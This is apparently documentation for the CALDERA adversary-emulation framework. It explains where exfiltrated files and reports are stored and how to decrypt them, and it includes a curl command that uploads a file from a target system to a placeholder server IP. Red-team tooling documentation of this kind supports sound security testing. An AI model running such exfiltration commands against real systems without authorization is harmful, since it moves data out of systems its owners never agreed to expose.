Exfiltration
====================

After completing an operation a user may want to review the data retreived from the target system. This data is automatically stored on the CALDERA server in a directory specified in [/conf/default.yml](Server-configuration.html#the-existing-default-yml).

## Accessing Exfiltrated Files

Some abilities will return files from the agent to the CALDERA server. This can also be done manually with 
```yaml
curl -X POST -F 'data=@/file/path/' http://server_ip:8888/file/upload
```
Note: localhost could be rejected in place of the server IP. In this case you will get error 7. You should type out the full IP.
These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-configuration.html#the-existing-default-yml). By default it is set to /tmp


## Accessing Operations Reports

After the server is shut down the reports from operations are placed inside the directory specified by the [/conf/default.yml to key "reports_dir"](Server-configuration.html#the-existing-default-yml). By default it is also set to /tmp


## Unencrypting the files
The reports and exfiltrated files are encrypted on the server. To view the file contents the user will have to decrypt the file using /app/utility/file_decryptor.py . This can be performed with:

```yaml
python /app/utility/file_decryptor.py --config /conf/default.yml _input file path_
```

The output file will already have the _decrypted tag appended to the end of the file name once the decrypted file is created by the python script.